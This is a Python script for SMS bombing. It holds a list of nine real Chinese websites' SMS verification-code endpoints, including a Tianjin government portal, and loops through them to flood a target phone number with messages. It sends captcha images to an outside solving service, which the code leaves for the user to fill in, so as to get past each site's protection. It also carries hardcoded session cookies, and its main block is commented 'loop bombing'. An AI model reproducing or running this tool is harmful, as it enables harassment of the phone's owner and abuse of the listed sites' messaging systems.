import requests,base64,json
requests.packages.urllib3.disable_warnings()
connect = requests.session()
jk_list = [
    {
        'first_url': '',
        'first_headers': None,
        'need_captcha': True,
        'captcha_url': 'https://www.waterchina.com/common/captcha?width=120&height=32',
        'captcha_headers': None,
        'submit_url': 'http://www.waterchina.com/user/phonemsg',
        'submit_headers': None,
        'submit_type': 'POST',
        'submit_cookies': None,
        'post_data':json.dumps(
            {
                'sPhone': '*#phone',
                'captchaNum': '*#captcha',
                'type': 'reg'
            }
        )
    },
    {
        'first_url':None,
        'first_headers':None,
        'need_captcha':True,
        'captcha_url':'http://member.djjlll.com/index.php/public/verify',
        'captcha_headers':None,
        'submit_url':'http://member.djjlll.com/index.php/user/getPhoneCode',
        'submit_headers': None,
        'submit_type':'POST',
        'submit_cookies': None,
        'post_data':json.dumps(
            {
                'AgencyName': 'djjlll',
                'referrer': '',
                'verifyUrl': 'register',
                'username': 'AFSVDZ',
                'password': 'azx123456',
                'repassword': 'azx123456',
                'phone': '*#phone',
                'verify': '*#captcha',
                'phoneCode': '',
                'agreement': '1',
                'memberType': '1'
            })
    },
    {
        'first_url':None,
        'first_headers':None,
        'need_captcha':True,
        'captcha_url':'http://www.ltidc.com/?m=api&c=captcha',
        'captcha_headers':None,
        'submit_url':'http://www.ltidc.com/register/sendMobileCode.html?mobile=*#phone&captcha=*#captcha',
        'submit_headers': None,
        'submit_type':'GET',
        'submit_cookies': None,
        'post_data':''
    },
    {
        'first_url':'http://qydj.scjg.tj.gov.cn/reportOnlineService/',
        'first_headers':{
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'zh-CN,zh;q=0.9,vi-VN;q=0.8,vi;q=0.7',
            'Cache-Control': 'max-age=0',
            'Connection': 'keep-alive',
            'DNT': '1',
            'Host': 'qydj.scjg.tj.gov.cn',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        },
        'need_captcha':False,
        'captcha_url':'',
        'captcha_headers':None,
        'submit_url':'http://qydj.scjg.tj.gov.cn/reportOnlineService/login_login',
        'submit_headers': {
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'zh-CN,zh;q=0.9,vi-VN;q=0.8,vi;q=0.7',
            'Connection': 'keep-alive',
            'Content-Length': '27',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'DNT': '1',
            'Host': 'qydj.scjg.tj.gov.cn',
            'Origin': 'http://qydj.scjg.tj.gov.cn',
            'Referer': 'http://qydj.scjg.tj.gov.cn/reportOnlineService/',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'X-Requested-With': 'XMLHttpRequest'
        },
        'submit_type':'POST',
        'submit_cookies': None,
        'post_data':json.dumps({
            'MOBILENO': '*#phone',
            'TEMP': 1})
    },
    {
        'need_captcha':True,
        'captcha_url':'https://developer.i4.cn/put/developeraction/getVerifyCode.go?verifyCodeSource=1',
        'captcha_headers':None,
        'submit_url':'https://developer.i4.cn/put/developeraction/getCommonMsgCode.go?phoneNumber=*#phone&codeType=6&verifyCodeSource=1&verifyCode=*#captcha',
        'submit_headers':None,
        'submit_type':'GET',
        'submit_cookies': None,
        'post_data':''
    },
    {
        'need_captcha':False,
        'captcha_url':'',
        'captcha_headers':None,
        'submit_url':'http://jrh.financeun.com/Login/sendMessageCode3.html?mobile=*#phone&mbid=197873&check=3',
        'submit_headers':None,
        'submit_type':'GET',
        'submit_cookies': {
            'PHPSESSID':'q8h78o91qm30m5bl7lufkt3go3','jrh_visit_log':'q8h78o91qm30m5bl7lufkt3go3','Hm_lvt_b627bb080fd97f01181b26820034cfcb':'1580999339','UM_distinctid':'1701ae772688ac-09ae1bde44e676-6701b35-144000-1701ae772699ca','CNZZDATA1276814029':'219078261-1580999135-%7C1580999135','Hm_lpvt_b627bb080fd97f01181b26820034cfcb':'1580999403'
        },
        'post_data':''
    },
    {
        'need_captcha':False,
        'captcha_url':'',
        'captcha_headers':None,
        'submit_url':'https://www.smartstudy.com/api/user-service/captcha/phone',
        'submit_headers':None,
        'submit_type':'POST',
        'submit_cookies': None,
        'post_data':json.dumps({"type": "authenticode","phone": "*#phone","countryCode": "86"})
    },
    {
        'need_captcha':False,
        'captcha_url':'',
        'captcha_headers':None,
        'submit_url':'https://www.yojiang.cn/api/user/send_verify_code?phone=*#phone',
        'submit_headers':None,
        'submit_type':'GET',
        'submit_cookies': {
                'guest_uuid':'5e3626fd9b6dde14e9293bee',
                '_xsrf':'2|a63a71a2|6bfa82e8f3ff66bbf83b67c2a67a9cf5|1580823294',
                'Hm_lvt_91f2894c14ed1eb5a6016e859758fb9c':'1580825404',
                'Hm_lpvt_91f2894c14ed1eb5a6016e859758fb9c':'1580825404'
        },
        'post_data':''
    },
    {
        'need_captcha':True,
        'captcha_url':'https://www.ymraaa.com/index.php?app=member&act=register&vcode=vcode',
        'captcha_headers':None,
        'submit_url':'https://www.ymraaa.com/index.php?app=member&act=send_code5&type=register&mobile=*#phone&vcode=*#captcha',
        'submit_headers':None,
        'submit_type':'GET',
        'submit_cookies':None,
        'post_data':''
    }
]
def captcha(url,headers=None):
    global connect
    if headers is None:
        headers = {
            'Accept': '*/*',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'zh-CN,zh;q=0.9,vi-VN;q=0.8,vi;q=0.7',
            'Connection': 'keep-alive',
            'DNT': '1',
            'sec-ch-ua': '" Not;A Brand";v="99", "Google Chrome";v="91", "Chromium";v="91"',
            'sec-ch-ua-mobile': '?0',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'X-Requested-With': 'XMLHttpRequest'
}
    try_time = 0
    while True:
        if try_time>10:
            print('打码失败超过十次')
            return False,False
        img = connect.get(url=url,headers=headers,verify=False)
        cookies = img.cookies
        img_str = '' + str(base64.b64encode(img.content)).replace('b\'', '').replace('\'','')
        #------------------------------------------------------------
        #这部分需要自己完善，将验证码的base64发给打码网站，返回打码结果
        captcha_service_url = ''
        captcha_data = {
            'data':img_str
        }
        captcha_result = connect.post(url=captcha_service_url,data=captcha_data)
        try:
            captcha_json = captcha_result.json()
            if captcha_json['code']==200:
                return cookies,captcha_json['date']
            else:
                print(captcha_json['msg'])
                try_time+=1
                continue
        #------------------------------------------------------------
        except Exception as e:
            try_time += 1
            print(e.__traceback__.tb_lineno)
            print(e)
            continue
def send_sms(jk:dict,phone:str):
    global connect
    jk['submit_url'] = jk['submit_url'].replace('*#phone',phone)
    jk['post_data'] = jk['post_data'].replace('*#phone',phone)
    if jk['need_captcha']:
        cookies,code = captcha(jk['captcha_url'],jk['captcha_headers'])
        if not cookies:
            return
        jk['submit_url'] = jk['submit_url'].replace('*#captcha',code)
        jk['post_data'] = jk['post_data'].replace('*#captcha',code)
    elif(jk.get('first_url') is None):
        cookies = jk['submit_cookies']
    else:
        result = connect.get(url=jk['first_url'],headers=jk['first_headers'])
        cookies = result.cookies
    if jk['submit_headers'] is None:
        jk['submit_headers'] = {
            'Accept': '*/*',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'zh-CN,zh;q=0.9,vi-VN;q=0.8,vi;q=0.7',
            'Connection': 'keep-alive',
            'DNT': '1',
            'sec-ch-ua': '" Not;A Brand";v="99", "Google Chrome";v="91", "Chromium";v="91"',
            'sec-ch-ua-mobile': '?0',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'X-Requested-With': 'XMLHttpRequest'
}
    if jk['submit_type'] == 'GET':
        result = connect.get(url=jk['submit_url'],headers=jk['submit_headers'],cookies=cookies)
        print(result.text)
    else:
        result = connect.post(url=jk['submit_url'], data=json.loads(jk['post_data']),headers=jk['submit_headers'], cookies=cookies)
        print(result.text)
if __name__ == '__main__':
  #循环轰炸
    for info in jk_list:
        send_sms(info,'这里填你的手机号码')
